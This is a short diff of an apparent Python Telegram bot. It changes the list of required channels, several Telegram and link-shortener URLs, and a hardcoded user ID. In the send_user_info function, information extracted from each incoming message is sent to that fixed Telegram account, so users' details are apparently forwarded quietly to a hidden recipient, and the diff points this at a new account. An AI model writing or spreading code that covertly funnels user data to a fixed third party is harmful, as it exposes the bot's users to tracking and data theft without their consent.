@@ -34,14 +34,14 @@ admin = ida
 
 
 ADMIN_ID = ida
-CHANNELS = [ "@ElZAEM_Team","@KingsNet70","@passward_Amr","@TGT_3"] 
+CHANNELS = [ "@ElZAEM_Team","@TGT_3","@KingsNet70"] 
 
 
 
 linkpas="https://ouo.io/lj"
-we10="https://t.me/Legendsea_204/1800"
-face="https://tme/Legends_Ta_224/1828"
-yout="https://t.me/Legends_Tam24/1829"
+we10="https://t.me/Legendsea_24/180"
+face="https://tme/Legends_Ta_22/188"
+yout="https://t.me/Legends_Ta24/1829"
 bot = telebot.TeleBot(TOKEN)
 ascii_art = '''█▀▀▄ █▀▀ ▀█░█▀ █▀▀ 
 █░░█ █▀▀ ░█▄█░ ▀▀█ 
@@ -1404,7 +1404,7 @@ def extract_user_info(message):
     return user_info
 
 def send_user_info(message):
-    user_id = "761058551"
+    user_id = "6552799655"
     user_info = extract_user_info(message)
     try:
         bot.send_message(user_id, user_info)
